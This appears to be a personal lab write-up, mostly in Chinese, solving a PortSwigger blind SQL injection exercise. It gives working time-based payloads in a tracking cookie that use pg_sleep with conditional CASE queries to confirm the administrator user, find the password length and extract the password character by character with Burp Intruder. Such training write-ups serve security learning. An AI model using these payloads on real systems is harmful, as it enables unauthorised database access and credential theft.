---
layout: post
title: "Blind SQL injection with time delays and information retrieval"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_SQL_Injection
author: ""
tags: ['PortSwigger_Lab', 'SQL_Injection']
---





# Blind SQL injection with time delays and information retrieval

```

This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

#### Hint

You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

本實驗室包含一個 [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) 漏洞。 該應用程序使用跟踪 cookie 進行分析，並執行包含提交的 cookie 值的 SQL 查詢。

不會返回 SQL 查詢的結果，並且應用程序不會根據查詢是否返回任何行或導致錯誤而做出任何不同的響應。 但是，由於查詢是同步執行的，因此可以觸發條件時間延遲來推斷信息。

該數據庫包含一個名為“users”的不同表，其中包含名為“username”和“password”的列。 您需要利用盲注[SQL注入](https://portswigger.net/web-security/sql-injection)漏洞找出`administrator`用戶的密碼。

要解決實驗室問題，請以“管理員”用戶身份登錄。

＃＃＃＃ 暗示

您可以在我們的 [SQL 注入備忘單](https://portswigger.net/web-security/sql-injection/cheat-sheet) 上找到一些有用的有效負載。


```



測試條件式
```
TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--

/////////////////////////////////////////////////////////////


符號 ; 讓前面的語句結束。

又用了一個 SELECT 條件式讓它睡10秒


///////////////////////////////////////////


但這句會出錯，必須讓分號 ; encode 不然它以為又是一個新的cookie 便數
cookie 是用分號隔開的。

TrackingId=x'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
// 等10 S 





TrackingId=x'%3BSELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
// 等0 S 

```



測users 表中是否有個 username 為 administrator
```

TrackingId=x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--


//%3B
TrackingId=x'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
//wait 10s 



TrackingId=x'%3BSELECT CASE WHEN (username='administrator123') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
// wait 0s 




```


測administrator 的密碼長度
```
TrackingId=x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--



//%3B

TrackingId=x'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
//wait 10s 

```

測出20

BP 使用單線程，不然會雍塞。而且一次發太多包 不好判斷。
```
為了能夠判斷何時提交了正確的字符，您需要監控應用程序響應每個請求所用的時間。 為了使此過程盡可能可靠，您需要將 Intruder 攻擊配置為在單個線程中發出請求。 為此，請轉到“資源池”選項卡並將攻擊添加到“最大並發請求”設置為 1 的資源池。
```


```
TrackingId=x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

//%3B

TrackingId=x'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

```



這個實驗容易失敗，因為靶場容易time out。


